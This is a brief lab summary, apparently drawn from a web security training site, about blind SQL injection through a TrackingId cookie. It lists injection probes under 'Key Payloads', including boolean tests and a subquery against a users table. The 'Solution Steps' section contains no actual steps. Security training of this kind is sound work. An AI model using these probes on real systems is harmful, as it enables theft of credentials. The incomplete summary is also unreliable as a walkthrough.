## Blind SQL injection with conditional responses

**Category:** sqli
**Difficulty:** Unknown

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

### Solution Steps
You can assume that the password only contains lowercase, alphanumeric characters.

### Key Payloads
- `Welcome back`
- `users`
- `username`
- `password`
- `administrator`
- `TrackingId`
- `TrackingId=xyz`
- `TrackingId=xyz' AND '1'='1`
- `TrackingId=xyz' AND '1'='2`
- `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: sqli

---
*Source: PortSwigger Web Security Academy*
